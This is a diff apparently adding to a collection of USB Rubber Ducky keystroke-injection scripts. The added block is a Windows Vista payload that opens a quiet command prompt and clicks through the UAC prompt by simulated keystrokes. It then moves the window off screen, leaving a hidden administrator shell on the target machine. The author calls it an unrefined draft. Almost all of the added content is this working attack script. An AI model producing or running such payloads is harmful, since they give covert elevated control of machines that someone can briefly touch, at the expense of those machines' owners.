@@ -13,3 +13,22 @@ DOWNARROW
 REPEAT 100
 ENTER
 ```
+The following is an unrefined attempt at creating a hide CMD window script that uses a key combo to run as administrator when UAC is turned on. The delays in this script are very heavy, and I will be making refinements later, so expect this script to change rapidly. 
+```
+REM Target: WINDOWS VISTA
+REM Purpose: Hide cmd window script that uses a key combo to circumvent UAC limitations. 
+DELAY 2000
+CONTROL ESCAPE
+DELAY 500
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT C
+DELAY 1000
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+```
